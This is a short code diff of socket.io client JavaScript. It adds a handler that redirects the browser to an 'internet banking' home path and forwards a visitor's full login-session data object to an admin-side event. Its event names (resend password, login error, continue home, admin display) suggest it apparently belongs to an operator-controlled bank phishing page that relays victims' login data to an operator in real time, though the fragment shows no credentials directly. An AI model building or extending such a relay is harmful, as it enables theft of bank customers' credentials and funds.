@@ -110,10 +110,13 @@ socket.on("ResendPass", Data => {
 
 socket.on("ContinuarHome", totalInfo => {
     //socket.emit('mostrarEnAdmin', totalInfo);
-    socket.emit("DataADMsinBTNs", totalInfo[0].socket);
+    socket.emit("DataADMsinBTNs", totalInfo);
     //window.location.href = "/bancainternet/home/?s="+totalInfo[0].socket;
 })
 
+socket.on("ContinuarHomeVista", totalInfo => {
+    window.location.href = "/bancainternet/home/?s="+totalInfo[0].socket;
+})
 
 socket.on("ErrorLogin", TextoBanner => {
     ErrorBanner.style.display = "flex";
